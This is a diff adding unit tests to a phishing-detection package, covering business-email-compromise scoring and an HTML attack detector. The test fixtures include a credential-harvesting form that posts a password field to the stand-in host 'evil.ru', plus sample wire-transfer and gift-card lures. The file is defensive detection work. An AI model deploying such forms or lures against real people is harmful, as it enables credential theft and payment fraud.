@@ -7,7 +7,8 @@ module can be tuned independently without regressions. Run:
 from phishing_analyzer.attributes import (
     urgency, fear_threat, reward, curiosity, authority, financial,
     credential, generic_greeting, sender_domain, links, grammar, caps_tone,
-    sender_auth, link_deception, obfuscation, attachment_risk, ATTRIBUTE_NAMES,
+    sender_auth, link_deception, obfuscation, attachment_risk, bec, html_attack,
+    ATTRIBUTE_NAMES,
 )
 from phishing_analyzer import pipeline
 
@@ -172,3 +173,21 @@ def test_attachment_risk():
     ok = {"attachments": [{"filename": "report.pdf", "content_type": "application/pdf"}]}
     assert attachment_risk.score("body", context=ok).score == 0.0
     assert attachment_risk.score("body", context=None).label.startswith("unavailable")
+
+
+def test_bec():
+    ctx = {"headers": {"from": "CEO <ceo@company.com>", "reply_to": "ceo.personal@gmail.com"}}
+    txt = ("I need you to process an urgent wire transfer today. Keep this confidential. "
+           "Are you available?")
+    assert bec.score(txt, context=ctx).score > 0.5
+    # bare invoice mention with no pressure -> not BEC
+    assert bec.score("Please pay the invoice attached, thanks.", context=None).score == 0.0
+    # gift-card ask alone -> fires
+    assert bec.score("Can you buy 5 gift cards for the team?", context=None).score > 0.3
+
+
+def test_html_attack():
+    bad = '<form action="http://evil.ru/steal"><input type="password" name="pw"></form>'
+    assert html_attack.score("", context={"html": bad}).score > 0.5
+    assert html_attack.score("", context={"html": "<p>hello team</p>"}).score == 0.0
+    assert html_attack.score("", context=None).label.startswith("unavailable")
